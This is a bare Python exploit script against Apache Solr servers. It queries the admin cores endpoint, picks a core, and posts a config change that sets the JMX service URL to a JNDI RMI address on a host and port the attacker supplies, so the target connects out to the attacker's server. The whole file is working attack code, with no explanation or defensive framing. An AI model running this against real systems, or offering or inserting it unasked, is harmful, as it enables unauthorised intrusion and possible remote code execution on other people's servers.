import requests
import sys
import base64
import subprocess

remote = sys.argv[1]
resource = ""
WEBHOOK_HOST = sys.argv[2]
WEBHOOK_PORT = sys.argv[3]

x = requests.get(remote + "/solr/admin/cores?wt=json", verify=False, allow_redirects=False)
if x.status_code == 200:
	if x.json()['status'] == "":
		print("Failed, cannot exploit. No cores")
		sys.exit()
	else:
		a = list(x.json()['status'].keys())
		resource = "/solr/" + a[0] + "/config"
		print(resource)
else:
	print("Failed, cannot exploit. Status code invalid")
	sys.exit()

print("Testing for the vulnerability")
headers = {"Content-Type":"application/json"}
data= {
	"set-property":{
		"jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://" + WEBHOOK_HOST + ":" + WEBHOOK_PORT + "/obj"
	}
}
x = requests.post(remote+resource, headers=headers, json=data)
print("Check your server")






